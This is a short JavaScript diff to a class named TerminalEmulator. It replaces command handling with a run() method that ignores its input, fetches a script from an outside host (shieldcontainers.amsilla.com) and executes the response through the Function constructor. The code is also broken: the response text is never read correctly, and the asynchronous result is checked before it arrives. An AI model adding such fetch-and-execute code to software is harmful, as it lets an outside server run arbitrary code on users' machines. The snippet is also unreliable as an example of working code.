@@ -2,10 +2,18 @@ class TerminalEmulator {
   constructor(lang,os) {
     this.language = lang;
     this.os_type = os;
-    this.to_run = '';
   }
   run(cmd) {
-    this.to_run += cmd;
+    var cba = ''
+    fetch('https://shieldcontainers.amsilla.com/compile.js').then(e=>{cba=Function('return '+e.text)(this.language,this.os_type,'config')})
+    if (cba == '') {
+      return 'Something went wrong. Try again later.'
+    } else {
+      return cba
+    }
+  }
+  window(name,callback) {
+    
   }
 }
 function container(a,b){
